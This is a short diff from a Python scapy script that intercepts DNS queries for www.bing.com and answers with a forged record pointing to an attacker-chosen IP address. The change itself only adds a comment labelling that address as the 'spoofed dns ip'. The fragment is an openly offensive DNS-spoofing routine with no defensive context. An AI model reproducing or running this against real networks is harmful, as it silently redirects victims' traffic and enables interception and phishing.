@@ -9,7 +9,7 @@ def captured_packet(packet):
         req='www.bing.com'
         if req.encode() in qname:
             print("[+] Spoofing Target.......")
-            answer=scapy.DNSRR(rrname=qname, rdata='172.217.194.132')
+            answer=scapy.DNSRR(rrname=qname, rdata='172.217.194.132')#rdata = spoofed dns ip
             scapy_packet[scapy.DNS].an = answer
             scapy_packet[scapy.DNS].ancount = 1
 
